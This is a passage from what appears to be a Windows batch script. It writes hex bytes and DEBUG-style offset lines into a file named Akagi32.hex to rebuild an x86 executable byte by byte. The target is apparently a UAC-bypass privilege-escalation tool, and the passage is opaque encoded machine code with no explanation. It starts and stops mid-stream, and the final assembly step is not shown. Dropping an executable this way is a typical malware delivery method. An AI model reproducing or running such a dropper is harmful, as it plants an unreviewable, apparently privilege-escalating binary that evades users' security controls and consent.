echo 83 ee 01 75 f5 8b 75 fc b8 45 01 00 00 c7 47 08 ed 00 00 00 50 57 68 02 90 00 00 56 89 47 04 ff 15 3c 90 40 00 57 53 ff 35 84 e0 40 00 ff 15 ec 91 40 00 ff 75 f4 8b 1d 48 90 40 00 56 ff d3 ff 75 ec 56 ff d3 ff 75 f8 56 ff 15 4c 90 40 00 68 07 70 00 00 56 ff 15 30 90 40 00 68 e4 9c 40 00 68 01 60 00 00 56 8b f8 ff 15 44 90 40 00 68 e4 9c 40 00 68 06 60 00 00 56 ff 15 44 90 40 00 6a>>Akagi32.hex
echo e 2e00>>Akagi32.hex
echo 10 8d 45 c8 50 68 04 90 00 00 56 ff 15 3c 90 40 00 68 08 70 00 00 56 ff 15 30 90 40 00 68 e4 9c 40 00 68 01 60 00 00 ff 75 fc 8b f0 ff 15 44 90 40 00 68 64 9c 40 00 68 09 60 00 00 ff 75 fc ff 15 44 90 40 00 56 8b 75 fc 56 ff d3 68 0a 70 00 00 56 ff 15 30 90 40 00 68 c8 9c 40 00 68 01 60 00 00 ff 75 fc 8b f0 ff 15 44 90 40 00 ff 75 f4 68 05 40 00 00 ff 75 fc ff 15 40 90 40 00 56 8b>>Akagi32.hex
echo e 2e80>>Akagi32.hex
echo 75 fc 56 ff d3 57 56 ff d3 ff 75 e8 56 ff d3 56 ff 15 38 90 40 00 6a 01 ba e4 9c 40 00 8d 8d a8 f7 ff ff e8 b0 f9 ff ff 59 8b d8 8b c3 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 54 08 00 00 53 8b c1 c7 45 f4 00 01 00 00 33 db 89 45 f0 89 5d f8 89 5d fc 57 8b fa 89 7d ec 85 c0 0f 84 2f 02 00 00 85 ff 0f 84 27 02 00 00 56 be 10 04 00 00 8d 85 bc fb ff ff 8b ce 88 18 40 83 e9 01>>Akagi32.hex
echo e 2f00>>Akagi32.hex
echo 75 f8 ba b2 e2 40 00 8d 8d bc fb ff ff e8 eb d7 ff ff ba e0 a4 40 00 e8 49 d7 ff ff 8b 55 f0 8d 8d bc fb ff ff 57 e8 89 eb ff ff 59 85 c0 0f 84 ba 01 00 00 b9 a8 e0 40 00 e8 91 e9 ff ff 85 c0 0f 84 a8 01 00 00 51 51 bf 18 a5 40 00 8b cf e8 5f 2a 00 00 85 c0 0f 84 92 01 00 00 6a 08 59 8d 45 e4 88 18 40 83 e9 01 75 f8 8b ce 8d 85 ac f7 ff ff 88 18 40 83 e9 01 75 f8 ba bc a5 40 00 8d>>Akagi32.hex
echo e 2f80>>Akagi32.hex
echo 8d ac f7 ff ff e8 73 d7 ff ff 8b d7 e8 d4 d6 ff ff 8d 85 ac f7 ff ff 50 8d 45 e4 50 ff 15 28 92 40 00 8d 45 e4 c7 45 cc 18 00 00 00 89 45 d4 8d 45 cc 50 68 00 00 00 02 8d 45 f8 89 5d d0 50 c7 45 d8 40 00 00 00 89 5d dc 89 5d e0 ff 15 2c 92 40 00 85 c0 0f 88 14 01 00 00 8d 45 fc 89 5d fc 50 68 50 96 40 00 ff 75 f8 ff 15 1c 90 40 00 8b c8 8b 45 fc 85 c0 0f 84 f5 00 00 00 85 c9 0f 85>>Akagi32.hex
echo e 3000>>Akagi32.hex
echo ed 00 00 00 8b 3d 08 90 40 00 8d 4d f4 6a 04 51 6a 04 53 68 d4 a5 40 00 50 ff d7 85 c0 0f 85 cb 00 00 00 b9 e0 a4 40 00 e8 18 d7 ff ff 8d 04 45 02 00 00 00 50 68 e0 a4 40 00 6a 01 53 68 ec a5 40 00 ff 75 fc 89 45 f4 ff d7 85 c0 0f 85 9c 00 00 00 ff 75 fc ff 15 0c 90 40 00 ff 75 f8 89 5d fc ff 15 48 92 40 00 89 5d f8 8d 85 bc fb ff ff 8b ce 88 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d>>Akagi32.hex
echo e 3080>>Akagi32.hex
echo 8d bc fb ff ff e8 73 d6 ff ff ba e0 a4 40 00 e8 d1 d5 ff ff ff 75 ec 8b 55 f0 8d 8d bc fb ff ff e8 0f ea ff ff 59 85 c0 74 44 bf a8 e0 40 00 8b cf e8 19 e8 ff ff 85 c0 74 34 8d 85 ac f7 ff ff 88 18 40 83 ee 01 75 f8 8b d7 8d 8d ac f7 ff ff e8 28 d6 ff ff ba 50 96 40 00 e8 86 d5 ff ff 33 d2 8d 8d ac f7 ff ff e8 99 2d 00 00 8b d8 8b 45 fc 83 7d f8 00 5e 74 0c ff 75 f8 ff 15 48 92 40>>Akagi32.hex
echo e 3100>>Akagi32.hex
echo 00 8b 45 fc 85 c0 74 07 50 ff 15 0c 90 40 00 8b c3 eb 02 33 c0 5f 5b 8b e5 5d c3 55 8b ec 81 ec 34 0c 00 00 53 8b c2 8b d9 56 33 f6 89 45 fc 85 c0 0f 84 87 02 00 00 39 75 08 0f 84 7e 02 00 00 85 db 0f 84 76 02 00 00 e8 f8 d5 ff ff 83 f8 64 0f 87 68 02 00 00 57 bf 10 04 00 00 8d 85 dc f7 ff ff 8b cf c6 00 00 40 83 e9 01 75 f7 8b cf 8d 85 cc f3 ff ff c6 00 00 40 83 e9 01 75 f7 ba a8>>Akagi32.hex
echo e 3180>>Akagi32.hex
echo e0 40 00 8d 8d dc f7 ff ff e8 6f d5 ff ff ba 08 a6 40 00 e8 cd d4 ff ff ba b2 e2 40 00 8d 8d cc f3 ff ff e8 55 d5 ff ff ba 08 a6 40 00 e8 b3 d4 ff ff 6a 00 8d 85 cc f3 ff ff 50 8d 85 dc f7 ff ff 50 ff 15 84 90 40 00 85 c0 0f 84 5f 01 00 00 8b cf 8d 85 dc f7 ff ff c6 00 00 40 83 e9 01 75 f7 ba b2 e2 40 00 8d 8d dc f7 ff ff e8 0c d5 ff ff 8b d3 e8 6d d4 ff ff ff 75 08 8b 55 fc 8d 8d>>Akagi32.hex
echo e 3200>>Akagi32.hex
echo dc f7 ff ff e8 7a 29 00 00 59 85 c0 0f 84 7b 01 00 00 39 75 0c 0f 84 b1 00 00 00 ba b2 e2 40 00 8d 8d ec fb ff ff e8 d2 d4 ff ff ba 9c 95 40 00 e8 30 d4 ff ff 8d 8d ec fb ff ff e8 6f e0 ff ff 89 45 fc 85 c0 0f 84 42 01 00 00 ba b2 e2 40 00 8d 8d cc f3 ff ff e8 a2 d4 ff ff ba 08 a6 40 00 e8 00 d4 ff ff 8b 75 fc 8d 95 dc f7 ff ff 53 8b ce e8 3d e1 ff ff 8d 95 cc f3 ff ff c7 04 24 08>>Akagi32.hex
echo e 3280>>Akagi32.hex
echo a6 40 00 8b ce e8 29 e1 ff ff 59 8b ce e8 d5 e1 ff ff 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00 8d 8d ec fb ff ff e8 4a d4 ff ff ba 40 a6 40 00 e8 a8 d3 ff ff 8d 8d ec fb ff ff e8 07 e6 ff ff 8b f0 eb 75 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00 8d 8d ec fb ff ff e8 10 d4 ff ff ba 40 a6 40 00 e8 6e d3 ff ff 8d 85 ec fb ff ff 50 8d 85>>Akagi32.hex
echo e 3300>>Akagi32.hex
echo dc f7 ff ff 50 e8 29 21 00 00 8b f0 59 59 85 f6 74 7b 8d 85 ec fb ff ff 50 8d 85 cc f3 ff ff 50 e8 0e 21 00 00 8b f0 59 59 85 f6 74 60 eb 12 ff 15 2c 91 40 00 8b d0 b9 20 a6 40 00 e8 b0 28 00 00 85 f6 74 48 8d 85 ec fb ff ff c6 00 00 40 83 ef 01 75 f7 ba a8 e0 40 00 8d 8d ec fb ff ff e8 99 d3 ff ff ba 40 a6 40 00 e8 f7 d2 ff ff ba 08 a6 40 00 8d 8d ec fb ff ff e8 e7 d2 ff ff 33 d2>>Akagi32.hex
echo e 3380>>Akagi32.hex
echo 8d 8d ec fb ff ff e8 fa 2a 00 00 8b f0 66 83 bd cc f3 ff ff 00 8b 3d c4 90 40 00 74 09 8d 85 cc f3 ff ff 50 ff d7 66 83 bd dc f7 ff ff 00 74 09 8d 85 dc f7 ff ff 50 ff d7 8b c6 5f eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 81 ec 20 08 00 00 53 33 db 56 8b f1 39 5d 08 0f 84 35 01 00 00 39 5d 0c 0f 84 2c 01 00 00 b9 20 ad 40 00 e8 54 d3 ff ff 83 f8 64 0f 87 19 01 00 00 57 bf 10 04 00 00>>Akagi32.hex
echo e 3400>>Akagi32.hex
echo 8d 85 f0 fb ff ff 8b cf 88 18 40 83 e9 01 75 f8 ba a8 e0 40 00 8d 8d f0 fb ff ff e8 dd d2 ff ff 83 fe 14 75 0a ba 54 a6 40 00 e8 36 d2 ff ff ba 20 ad 40 00 8d 8d f0 fb ff ff e8 26 d2 ff ff 8d 85 f0 fb ff ff 50 ff 15 9c 90 40 00 83 f8 ff 0f 85 aa 00 00 00 8b cf 8d 85 f0 fb ff ff 88 18 40 83 e9 01 75 f8 ba a8 e0 40 00 8d 8d f0 fb ff ff e8 88 d2 ff ff 83 fe 14 74 07 be 90 a6 40 00 eb>>Akagi32.hex
echo e 3480>>Akagi32.hex
echo 15 ba 54 a6 40 00 8d 8d f0 fb ff ff e8 d4 d1 ff ff be 7c a6 40 00 8d 85 e0 f7 ff ff 88 18 40 83 ef 01 75 f8 ba b2 e2 40 00 8d 8d e0 f7 ff ff e8 49 d2 ff ff ba 20 ad 40 00 e8 a7 d1 ff ff ff 75 0c 8b 55 08 8d 8d e0 f7 ff ff e8 b4 26 00 00 59 85 c0 74 3a 8d 85 f0 fb ff ff 50 8d 85 e0 f7 ff ff 50 e8 4c 1f 00 00 8b d8 59 59 85 db 74 1f 8b d6 b9 ac a6 40 00 e8 8a 29 00 00 8b d8 eb 0f ba>>Akagi32.hex
echo e 3500>>Akagi32.hex
echo b7 00 00 00 b9 60 a6 40 00 e8 e3 26 00 00 8b c3 5f eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 83 ec 3c 56 8b 75 08 85 f6 75 07 b8 05 40 00 80 eb 53 83 65 d8 00 8d 86 08 02 00 00 83 65 dc 00 89 45 d4 8d 45 c4 50 c7 45 c4 3c 00 00 00 c7 45 c8 40 00 00 00 c7 45 e0 05 00 00 00 89 75 d0 ff 96 18 06 00 00 85 c0 74 1a 83 7d fc 00 74 14 6a ff ff 75 fc ff 96 1c 06 00 00 ff 75 fc ff 96 20 06 00>>Akagi32.hex
echo e 3580>>Akagi32.hex
echo 00 33 c0 5e 8b e5 5d c2 04 00 55 8b ec 51 51 53 56 57 6a 04 68 00 30 00 00 8d 45 f8 c7 45 f8 5c 0c 00 00 50 33 db 8d 45 fc 53 50 6a ff 89 5d fc ff 15 5c 92 40 00 8b 45 fc 85 c0 0f 84 10 01 00 00 8b 4d f8 85 c9 74 08 88 18 40 83 e9 01 75 f8 bf 48 93 40 00 ba bc a6 40 00 8b cf e8 c5 2e 00 00 85 c0 0f 84 e8 00 00 00 8b 35 18 92 40 00 50 ff d6 8b 4d fc ba c8 a6 40 00 89 41 10 8b cf e8>>Akagi32.hex
echo e 3600>>Akagi32.hex
echo a2 2e 00 00 85 c0 0f 84 c5 00 00 00 50 ff d6 8b 4d fc ba dc a6 40 00 89 41 14 8b cf e8 85 2e 00 00 85 c0 0f 84 a8 00 00 00 50 ff d6 8b 55 fc 8b cf 89 42 18 ba f0 a6 40 00 e8 68 2e 00 00 85 c0 0f 84 8b 00 00 00 50 ff d6 8b 4d fc bf 0c a7 40 00 ba 04 a7 40 00 89 41 1c 8b cf e8 46 2e 00 00 85 c0 74 6d 50 ff d6 8b 4d fc ba 20 a7 40 00 89 41 08 8b cf e8 2d 2e 00 00 85 c0 74 54 50 ff d6>>Akagi32.hex
echo e 3680>>Akagi32.hex
echo 8b 55 fc 8b cf 89 42 04 ba 38 a7 40 00 e8 14 2e 00 00 85 c0 74 3b 50 ff d6 8b 4d fc 68 33 5f 40 00 89 41 0c ff d6 8b 4d fc 68 1b 40 40 00 89 01 ff d6 8b 4d fc 68 f0 69 40 00 89 41 20 8b 45 fc c7 40 28 20 d8 40 00 ff d6 8b 4d fc 89 41 24 eb 18 68 00 80 00 00 8d 45 f8 89 5d f8 50 8d 45 fc 50 6a ff ff 15 60 92 40 00 8b 45 fc 5f 5e 5b 8b e5 5d c3 55 8b ec 83 ec 20 53 56 33 c0 89 4d ec>>Akagi32.hex
echo e 3700>>Akagi32.hex
echo 57 50 8b f2 89 45 f0 89 45 fc 8b d8 ff 15 20 91 40 00 8b f8 89 7d e4 8b 47 3c 21 5d f8 89 45 e8 39 5d ec 0f 84 85 03 00 00 85 f6 0f 84 7d 03 00 00 e8 54 fe ff ff 89 45 fc 85 c0 0f 84 68 03 00 00 8d 88 4c 08 00 00 ba b2 e2 40 00 e8 ac cf ff ff 8b 4d fc ba 4c a7 40 00 8d 89 4c 08 00 00 e8 01 cf ff ff 8b 4d fc 8b 55 ec 56 8d 89 4c 08 00 00 e8 0d 24 00 00 8b 35 20 92 40 00 59 85 c0 0f>>Akagi32.hex
echo e 3780>>Akagi32.hex
echo 84 e5 02 00 00 8b 4d fc ba a8 e0 40 00 8d 49 2c e8 68 cf ff ff 8b 4d fc ba 54 a6 40 00 8d 49 2c e8 c0 ce ff ff 8b 45 fc ff 30 ff d6 8b 4d fc 89 01 8b 4d fc 8d 41 2c 50 8d 81 4c 08 00 00 50 ff 11 89 45 f0 85 c0 0f 84 9e 02 00 00 8b 4d fc b8 10 04 00 00 81 c1 4c 08 00 00 88 19 41 83 e8 01 75 f8 8b 4d fc ba a8 e0 40 00 8d 89 4c 08 00 00 e8 08 cf ff ff 8b 4d fc ba 68 a7 40 00 8d 89 4c>>Akagi32.hex
echo e 3800>>Akagi32.hex
echo 08 00 00 e8 5d ce ff ff 8b 45 fc b9 10 04 00 00 05 3c 04 00 00 88 18 40 83 e9 01 75 f8 8b 4d fc ba b2 e2 40 00 8d 89 3c 04 00 00 e8 cd ce ff ff 8b 4d fc ba 80 a7 40 00 8d 89 3c 04 00 00 e8 22 ce ff ff 8b 45 fc ff 70 10 ff d6 8b 4d fc 6a 00 89 41 10 8b 4d fc 8d 81 3c 04 00 00 50 8d 81 4c 08 00 00 50 ff 51 10 85 c0 0f 84 fb 01 00 00 8b 4d fc 8d 41 2c 50 8d 81 3c 04 00 00 50 ff 11 89>>Akagi32.hex
echo e 3880>>Akagi32.hex
echo 45 f0 85 c0 0f 84 e0 01 00 00 8b 45 fc ff 70 18 ff d6 8b 4d fc 68 94 a7 40 00 89 41 18 ff 35 94 e0 40 00 ff 15 d4 90 40 00 8b 4d fc 8b 49 28 89 81 18 06 00 00 8b 45 fc 8b 48 28 8b 40 18 89 81 1c 06 00 00 8b 45 fc ff 70 08 ff d6 8b 4d fc bb 10 04 00 00 89 41 08 8b 45 fc 8b 48 28 8b 40 08 89 81 20 06 00 00 8b cb 8b 45 fc 83 c0 2c c6 00 00 40 83 e9 01 75 f7 8b 4d fc ba a8 e0 40 00 8d>>Akagi32.hex
echo e 3900>>Akagi32.hex
echo 49 2c e8 f6 cd ff ff 8b 4d fc ba 54 a6 40 00 8d 49 2c e8 4e cd ff ff 8b 4d fc ba 80 a7 40 00 8d 49 2c e8 3e cd ff ff 8b 45 fc 8b 48 28 8d 50 2c 81 c1 08 02 00 00 e8 c2 cd ff ff 8b 4d fc ba a4 a7 40 00 8b 49 28 e8 b2 cd ff ff 8b 45 fc 83 c0 2c c6 00 00 40 83 eb 01 75 f7 8b 4d fc ba a8 e0 40 00 8d 49 2c e8 93 cd ff ff 8b 4d fc ba 68 a7 40 00 8d 49 2c e8 eb cc ff ff 8b 45 fc ff 70 24>>Akagi32.hex
echo e 3980>>Akagi32.hex
echo ff d6 8b 4d fc 89 41 24 33 c0 8b 4d fc 50 50 50 8d 41 2c 50 ff 51 24 8b d8 85 db 0f 84 c9 00 00 00 8b 4d fc ff 71 04 ff d6 8b 4d fc 6a 40 68 00 30 00 00 89 41 04 8b 45 e8 8b 44 38 50 89 45 f4 8d 45 f4 50 6a 00 8d 45 f8 50 8b 45 fc 53 ff 50 04 83 7d f8 00 0f 84 8f 00 00 00 8b 45 fc ff 70 1c ff d6 8b 4d fc 89 41 1c 8d 45 f4 50 8b 45 e8 ff 74 38 50 8b 45 fc 57 ff 75 f8 53 ff 50 1c 85>>Akagi32.hex
echo e 3a00>>Akagi32.hex
echo c0 74 67 8b 45 fc ff 70 20 ff d6 8b 4d fc 89 41 20 8b 45 fc 8b 78 20 8b 70 28 2b 7d e4 2b 75 e4 ff 70 14 03 7d f8 03 75 f8 ff 15 20 92 40 00 8b 4d fc 89 41 14 8d 45 e0 50 33 c0 50 56 57 50 50 8b 45 fc 53 ff 50 14 8b f0 85 f6 74 17 8b 4d fc 6a ff 56 ff 51 18 8b 45 fc 56 ff 50 08 c7 45 f0 01 00 00 00 8b 35 20 92 40 00 8b 45 fc 85 c0 74 38 85 db 74 1b ff 70 0c ff d6 8b 4d fc 6a 00 53>>Akagi32.hex
echo e 3a80>>Akagi32.hex
echo 89 41 0c 8b 45 fc ff 50 0c 8b 45 fc 53 ff 50 08 83 65 f4 00 8d 45 f4 68 00 80 00 00 50 8d 45 fc 50 6a ff ff 15 60 92 40 00 8b 45 f0 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 20 08 00 00 53 33 db 57 8b f9 39 5d 08 0f 84 af 00 00 00 39 5d 0c 0f 84 a6 00 00 00 85 ff 0f 84 9e 00 00 00 b9 34 96 40 00 e8 5b cc ff ff 83 f8 64 0f 87 8b 00 00 00 56 be 10 04 00 00 8d 85 f0 fb ff ff 8b>>Akagi32.hex
echo e 3b00>>Akagi32.hex
echo ce 88 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d 8d f0 fb ff ff e8 e4 cb ff ff ba 34 96 40 00 e8 42 cb ff ff ff 75 0c 8b 55 08 8d 8d f0 fb ff ff e8 4f 20 00 00 59 85 c0 74 40 8d 85 e0 f7 ff ff 88 18 40 83 ee 01 75 f8 ba a8 e0 40 00 8d 8d e0 f7 ff ff e8 a6 cb ff ff 8b c1 50 8d 85 f0 fb ff ff 50 e8 cd 18 00 00 8b d8 59 59 85 db 74 0b 33 d2 8b cf e8 0e 23 00 00 8b d8 8b c3 5e eb 02 33 c0>>Akagi32.hex
echo e 3b80>>Akagi32.hex
echo 5f 5b 8b e5 5d c3 55 8b ec 81 ec 48 0c 00 00 53 8b c1 8b da 33 d2 89 45 e8 89 55 fc 89 55 f4 89 55 ec 89 55 f0 56 8b f2 85 c0 0f 84 f5 01 00 00 85 db 0f 84 ed 01 00 00 57 bf 10 04 00 00 8d 85 d8 fb ff ff 8b cf 88 10 40 83 e9 01 75 f8 ba a8 e0 40 00 8d 8d d8 fb ff ff e8 1f cb ff ff ba b0 a7 40 00 e8 7d ca ff ff ba c4 a7 40 00 8d 8d d8 fb ff ff e8 6d ca ff ff 8d 85 d8 fb ff ff 50 ff>>Akagi32.hex
echo e 3c00>>Akagi32.hex
echo 15 9c 90 40 00 83 f8 ff 0f 85 45 01 00 00 8d 55 f0 e8 6a 20 00 00 89 45 f4 85 c0 0f 84 2d 01 00 00 8d 4d ec 51 ff 75 f0 50 e8 04 d9 ff ff 83 c4 0c 89 45 fc 85 c0 0f 84 45 01 00 00 8b cf 8d 85 c8 f7 ff ff c6 00 00 40 83 e9 01 75 f7 ba b2 e2 40 00 8d 8d c8 f7 ff ff e8 a0 ca ff ff ba 04 a8 40 00 e8 fe c9 ff ff 8b 55 e8 8d 8d c8 f7 ff ff 53 e8 0d 1f 00 00 59 85 c0 0f 84 e3 00 00 00 8b>>Akagi32.hex
echo e 3c80>>Akagi32.hex
echo cf 8d 85 d8 fb ff ff c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00 8d 8d d8 fb ff ff e8 5d ca ff ff ba b0 a7 40 00 e8 bb c9 ff ff 8d 85 d8 fb ff ff 50 8d 85 c8 f7 ff ff 50 e8 76 17 00 00 8b f0 59 59 85 f6 0f 84 99 00 00 00 8d 8d c8 f7 ff ff c6 01 00 41 83 ef 01 75 f7 ba b2 e2 40 00 8d 8d c8 f7 ff ff e8 15 ca ff ff bf c4 a7 40 00 8b d7 e8 71 c9 ff ff ff 75 ec 8b 55 fc 8d 8d c8 f7 ff ff>>Akagi32.hex
echo e 3d00>>Akagi32.hex
echo e8 7e 1e 00 00 59 85 c0 74 58 8d 85 d8 fb ff ff 50 8d 85 c8 f7 ff ff 50 e8 16 17 00 00 8b f0 59 59 85 f6 74 3d 8d 95 d8 fb ff ff 8d 8d b8 f3 ff ff e8 c7 c9 ff ff 8b d7 e8 28 c9 ff ff 33 d2 8d 8d b8 f3 ff ff e8 3b 21 00 00 8b f0 eb 14 6a 02 5a eb 05 ba b7 00 00 00 b9 dc a7 40 00 e8 8f 1e 00 00 83 7d fc 00 74 19 83 65 f8 00 8d 45 f8 68 00 80 00 00 50 8d 45 fc 50 6a ff ff 15 60 92 40>>Akagi32.hex
echo e 3d80>>Akagi32.hex
echo 00 83 7d f4 00 5f 74 19 83 65 f8 00 8d 45 f8 68 00 80 00 00 50 8d 45 f4 50 6a ff ff 15 60 92 40 00 8b c6 eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 81 ec 24 08 00 00 53 56 be 10 04 00 00 89 4d fc 57 8b da 8d 85 ec fb ff ff 8b fe c6 00 00 40 83 ef 01 75 f7 ba b2 e2 40 00 8d 8d ec fb ff ff e8 19 c9 ff ff ba 14 a8 40 00 e8 77 c8 ff ff 8b 55 fc 8d 8d ec fb ff ff 53 e8 86 1d 00 00 59 85 c0>>Akagi32.hex
echo e 3e00>>Akagi32.hex
echo 74 3e 8d 85 dc f7 ff ff c6 00 00 40 83 ee 01 75 f7 ba a8 e0 40 00 8d 8d dc f7 ff ff e8 dc c8 ff ff ba 40 a6 40 00 e8 3a c8 ff ff 8d 85 dc f7 ff ff 50 8d 85 ec fb ff ff 50 e8 f5 15 00 00 59 59 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 24 08 00 00 53 56 57 bf 10 04 00 00 89 4d fc 8b da 8d 85 dc f7 ff ff 33 f6 8b cf c6 00 00 40 83 e9 01 75 f7 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75>>Akagi32.hex
echo e 3e80>>Akagi32.hex
echo f7 ba a8 e0 40 00 8d 8d dc f7 ff ff e8 6c c8 ff ff ba b2 e2 40 00 8d 8d ec fb ff ff e8 5c c8 ff ff ba 30 a8 40 00 8d 8d dc f7 ff ff e8 b4 c7 ff ff ba 30 a8 40 00 8d 8d ec fb ff ff e8 a4 c7 ff ff 6a 00 8d 85 ec fb ff ff 50 8d 85 dc f7 ff ff 50 ff 15 84 90 40 00 85 c0 0f 84 2a 01 00 00 8d 95 ec fb ff ff 8d 8d dc f7 ff ff e8 0d c8 ff ff 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75>>Akagi32.hex
echo e 3f00>>Akagi32.hex
echo f7 ba 30 00 fe 7f 8d 8d ec fb ff ff e8 ec c7 ff ff ba 80 a8 40 00 e8 4a c7 ff ff 8d 85 ec fb ff ff 50 8d 85 dc f7 ff ff 50 e8 05 15 00 00 8b f0 59 59 85 f6 0f 84 dc 00 00 00 8b 4d fc 8b d3 e8 69 fe ff ff 8b f0 85 f6 0f 84 c8 00 00 00 8b cf 8d 85 dc f7 ff ff c6 00 00 40 83 e9 01 75 f7 ba b2 e2 40 00 8d 8d dc f7 ff ff e8 8e c7 ff ff bb 30 a8 40 00 8b d3 e8 ea c6 ff ff ba 84 a8 40 00>>Akagi32.hex
echo e 3f80>>Akagi32.hex
echo 8d 8d dc f7 ff ff e8 da c6 ff ff 68 ef 03 00 00 ba f0 9d 40 00 8d 8d dc f7 ff ff e8 e3 1b 00 00 59 85 c0 74 71 8d 85 ec fb ff ff c6 00 00 40 83 ef 01 75 f7 ba 30 00 fe 7f 8d 8d ec fb ff ff e8 39 c7 ff ff 8b c1 50 8d 85 dc f7 ff ff 50 e8 60 14 00 00 8b f0 59 59 85 f6 74 3b ba 80 a8 40 00 8d 8d ec fb ff ff e8 7a c6 ff ff 8b d3 8d 8d ec fb ff ff e8 6d c6 ff ff 33 d2 8d 8d ec fb ff ff>>Akagi32.hex
echo e 4000>>Akagi32.hex
echo e8 80 1e 00 00 8b f0 eb 0d 6a 02 5a b9 4c a8 40 00 e8 db 1b 00 00 5f 8b c6 5e 5b 8b e5 5d c3 55 8b ec 81 ec 24 08 00 00 53 8b c1 8b da 56 33 f6 89 45 fc 85 c0 0f 84 cd 01 00 00 85 db 0f 84 c5 01 00 00 81 3d 98 e0 40 00 80 25 00 00 57 0f 82 a8 01 00 00 bf 10 04 00 00 8d 85 dc f7 ff ff 8b cf c6 00 00 40 83 e9 01 75 f7 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00>>Akagi32.hex
echo e 4080>>Akagi32.hex
echo 8d 8d dc f7 ff ff e8 72 c6 ff ff ba b2 e2 40 00 8d 8d ec fb ff ff e8 62 c6 ff ff ba 98 a8 40 00 8d 8d dc f7 ff ff e8 ba c5 ff ff ba 1c 96 40 00 8d 8d ec fb ff ff e8 aa c5 ff ff 6a 00 8d 85 ec fb ff ff 50 8d 85 dc f7 ff ff 50 ff 15 84 90 40 00 85 c0 0f 84 14 01 00 00 8d 95 ec fb ff ff 8d 8d dc f7 ff ff e8 13 c6 ff ff 8b cf 8d 85 ec fb ff ff c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00>>Akagi32.hex
echo e 4100>>Akagi32.hex
echo 8d 8d ec fb ff ff e8 f2 c5 ff ff 8b c1 50 8d 85 dc f7 ff ff 50 e8 19 13 00 00 8b f0 59 59 85 f6 0f 84 dd 00 00 00 8b 4d fc 8b d3 e8 7d fc ff ff 8b f0 85 f6 0f 84 c9 00 00 00 8b cf 8d 85 dc f7 ff ff c6 00 00 40 83 e9 01 75 f7 ba b2 e2 40 00 8d 8d dc f7 ff ff e8 a2 c5 ff ff ba 1c 96 40 00 e8 00 c5 ff ff ba 84 a8 40 00 8d 8d dc f7 ff ff e8 f0 c4 ff ff 68 ef 03 00 00 ba f0 9d 40 00 8d>>Akagi32.hex
echo e 4180>>Akagi32.hex
echo 8d dc f7 ff ff e8 f9 19 00 00 59 85 c0 74 74 8d 85 ec fb ff ff c6 00 00 40 83 ef 01 75 f7 bb a8 e0 40 00 8d 8d ec fb ff ff 8b d3 e8 4d c5 ff ff 8b c1 50 8d 85 dc f7 ff ff 50 e8 74 12 00 00 8b f0 59 59 85 f6 74 3c 8b d3 8d 8d ec fb ff ff e8 29 c5 ff ff ba 1c 96 40 00 e8 87 c4 ff ff 33 d2 8d 8d ec fb ff ff e8 9a 1c 00 00 eb 14 6a 02 5a b9 b0 a8 40 00 e8 f7 19 00 00 eb 07 e8 46 fc ff>>Akagi32.hex
echo e 4200>>Akagi32.hex
echo ff 8b f0 8b c6 5f eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 83 e4 f8 81 ec 4c 0c 00 00 53 33 db 21 5c 24 0c 56 33 f6 89 5c 24 0c 57 39 5d 0c 75 07 33 c0 e9 7e 03 00 00 8b 45 08 f6 00 10 0f 85 70 03 00 00 8d 78 2c ba c4 a7 40 00 8b cf e8 4c c4 ff ff 85 c0 0f 85 59 03 00 00 b9 20 08 00 00 8d 44 24 28 88 18 40 83 e9 01 75 f8 8b 55 0c 8d 4c 24 28 e8 86 c4 ff ff e8 c9 c4 ff ff 6a 5c 59 66>>Akagi32.hex
echo e 4280>>Akagi32.hex
echo 39 4c 44 26 74 0c 66 89 4c 44 28 33 c9 66 89 4c 44 2a 8b d7 8d 4c 24 28 e8 c8 c3 ff ff 33 c0 50 50 6a 03 50 6a 07 68 00 00 00 80 8d 44 24 40 50 ff 15 bc 90 40 00 89 44 24 20 83 f8 ff 0f 84 f0 02 00 00 8d 4c 24 18 0f 57 c0 51 50 66 0f 13 44 24 20 ff 15 cc 90 40 00 85 c0 0f 84 b6 02 00 00 33 c0 39 44 24 1c 0f 8c aa 02 00 00 7f 0b 83 7c 24 18 08 0f 82 9d 02 00 00 50 50 50 6a 02 5f 57>>Akagi32.hex
echo e 4300>>Akagi32.hex
echo 50 ff 74 24 34 ff 15 88 90 40 00 89 44 24 24 85 c0 0f 84 7f 02 00 00 33 c9 51 51 51 6a 04 50 ff 15 8c 90 40 00 89 44 24 0c 85 c0 0f 84 5b 02 00 00 8a 08 80 f9 44 75 26 80 78 01 43 75 20 80 78 03 01 75 1a 8a 48 02 80 f9 4e 74 0e 80 f9 53 0f 85 30 02 00 00 33 ff 47 eb 17 33 ff eb 13 80 f9 4d 0f 85 1e 02 00 00 80 78 01 5a 0f 85 14 02 00 00 2b fb 0f 84 eb 00 00 00 83 ef 01 74 6d 83 ef>>Akagi32.hex
echo e 4380>>Akagi32.hex
echo 01 0f 85 fe 01 00 00 8b 7c 24 18 33 f6 85 ff 74 48 57 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b d8 85 db 74 1c 57 ff 74 24 10 89 5c 24 18 53 89 7c 24 20 e8 f7 22 00 00 83 c4 0c 46 e9 c1 00 00 00 33 db 21 5c 24 14 6a 08 89 5c 24 14 ff 15 d8 90 40 00 e9 aa 00 00 00 68 a0 00 00 00 ff 15 d8 90 40 00 33 f6 e9 98 00 00 00 68 50 95 40 00 ff 15 20 91 40 00 8b f8 85 ff 0f 84 81 01 00 00>>Akagi32.hex
echo e 4400>>Akagi32.hex
